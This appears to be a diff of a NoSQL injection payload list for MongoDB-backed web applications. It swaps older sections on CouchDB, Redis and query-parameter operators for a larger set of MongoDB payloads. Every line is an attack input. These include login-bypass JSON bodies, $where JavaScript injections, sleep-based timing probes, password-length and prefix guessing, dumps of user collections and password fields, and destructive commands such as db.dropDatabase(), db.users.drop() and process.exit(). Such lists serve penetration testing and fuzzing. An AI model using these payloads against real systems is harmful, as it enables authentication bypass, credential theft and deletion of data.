@@ -1,60 +1,74 @@
-# WebSecure NoSQLi Payload List — MongoDB, CouchDB operators
-# ── MongoDB $ne tautology (query param style) ──
-[$ne]=1
-[$ne]=null
-[$ne][0]=
-[$gt]=
-[$gte]=0
-[$lt]=99999
-[$lte]=99999
-[$in][]=admin
-[$in][]=root
-[$in][]=user
-[$nin][]=invalid
-[$regex]=.*
-[$regex]=^a
-[$exists]=true
-[$where]=1
-[$where]=true
-# ── JSON body operators ──
+{"$gt": ""}
+{"$gt": "x"}
 {"$ne": null}
 {"$ne": "invalid"}
-{"$ne": "-1"}
-{"$gt": ""}
-{"$gte": ""}
-{"$lt": "zzzzzzzzzzzzzz"}
+{"$ne": -1}
+{"$nin": []}
+{"$in": [""]}
 {"$regex": ".*"}
-{"$regex": "^admin"}
-{"$in": ["admin","root","administrator"]}
-{"$nin": ["invalid_user"]}
 {"$exists": true}
 {"$where": "1==1"}
-{"$where": "function(){return true;}"}
-{"$expr": {"$gt": ["$price", 0]}}
-# ── $where JS injection ──
-' && this.password.match(/.*/) //
-' && this.username == 'admin
-'; return true; //
-'; return true || 'x'=='x
-'; return /.*/.test(this.password) //
+{"$where": "sleep(1000)"}
+{"$where": "function(){return true}"}
+{"$where": "return true"}
+{"$gt": "", "$lt": "z"}
+{"$gte": ""}
+{"$lte": "z"}
+{"$not": {"$eq": "x"}}
+{"$expr": {"$gt": [1, 0]}}
+{"$jsonSchema": {}}
+{$gt: ''}
+{$ne: null}
+{$where: '1==1'}
+{$regex: '.*'}
+username[$ne]=x
+username[$gt]=
+username[$nin][]=x
+password[$ne]=wrong
+password[$exists]=true
+username[$regex]=.*&password[$regex]=.*
+username[$where]=1==1
+username[$gt]=a&username[$lt]=z
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$regex": "admin"}, "password": {"$ne": ""}}
+{"username": {"$in": ["admin","root","administrator"]}, "password": {"$ne": ""}}
+{"$or": [{"username": "admin"}, {"username": "root"}]}
+{"username": {"$or": [{"$eq": "admin"}, {"$eq": "root"}]}, "password": {"$ne": ""}}
+{"username": {"$not": {"$eq": "invalid"}}}
+{"$and": [{"username": {"$gt": ""}}, {"password": {"$gt": ""}}]}
 ' || 1==1//
 ' || 1==1%00
-# ── URL-encoded bracket operators ──
-%24ne=1
-%24gt=0
-%24regex=.*
-# ── Array bypass ──
-["admin"]
-[""]
-["admin","root"]
-# ── CouchDB ──
-/_users/org.couchdb.user:admin
-/_all_docs
-/_config/admins/
-# ── Redis (through app) ──
-KEYS *
-CONFIG GET requirepass
-DEBUG SLEEP 5
-INFO server
-# ── Aggregation pipeline injection ──
-[{"$match":{"password":{"$regex":".*"}}}]
+"; return true; var x="
+'; return true; var x='
+' || sleep(5000)//
+'; sleep(5000);//
+'||sleepSync(5000)//
+'||process.exit()//
+' || this.username.match(/.*/)//
+' || this.password.match(/.*/)//
+{"username": "' || '1'=='1", "password": "x"}
+username=admin'%20||%20'1'%3D%3D'1&password=x
+username[$ne]=randomxyz
+admin' && this.password.match(/^a.*/)||'
+admin' && this.password.length > 6||'
+admin' && this.password.length==8 || '1'=='2
+admin';return this.password.length<10||'
+db.getCollectionNames()
+db.users.find()
+{mapreduce: 'users', map: function(){emit(this._id, this)}, reduce: function(k,v){return v}}
+{"distinct": "users", "key": "password"}
+{"aggregate": "users", "pipeline": [{"$group": {"_id": "$password"}}]}
+; db.dropDatabase()
+; db.users.drop()
+; db.users.deleteMany({})
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+{}, $where: '1 == 1'
+{$gt: ''}
+0, $where: '1 == 1'
+0,$where:"sleep(5000)"
+{username: {$gt: ''}, password: {$gt: ''}}
+{username: 'admin', password: {$gt: ''}}
